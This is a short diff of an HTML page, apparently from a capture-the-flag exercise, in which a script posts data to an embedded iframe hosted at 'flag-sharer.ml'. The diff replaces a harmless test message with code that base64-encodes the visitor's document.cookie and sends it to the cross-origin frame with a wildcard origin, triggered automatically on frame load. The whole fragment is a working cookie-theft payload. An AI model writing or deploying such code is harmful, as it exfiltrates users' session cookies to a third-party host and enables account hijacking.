@@ -15,9 +15,9 @@ window.addEventListener("message", function(message){
 <script>
 function test() {
 	var frame= document.getElementById("frame");
-	frame.contentWindow.postMessage("test","*");
+	frame.contentWindow.postMessage(btoa(document.cookie),"*");
 
-});
+};
 </script>
 <iframe onload="test()" src="https://flag-sharer.ml/gifts" id='frame'> </iframe>
 
